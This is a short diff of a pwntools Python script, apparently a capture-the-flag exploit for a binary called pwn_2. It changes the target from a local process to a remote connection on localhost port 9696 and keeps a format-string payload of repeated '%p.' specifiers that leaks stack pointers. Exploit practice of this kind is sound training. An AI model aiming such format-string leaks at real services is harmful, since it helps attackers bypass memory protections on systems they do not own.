@@ -1,9 +1,13 @@
 from pwn import *
 import math
 
+ip = "localhost"
+port = 9696
+
 payload = b"%p."*(50//3)
 
-p = process("./pwn_2")
+p = remote(ip, port)
+#p = process("./pwn_2")
 p.send(payload+b"\n")
 data = p.recv()
 data = data.split(b"\n")[-1].split(b".")[5:]
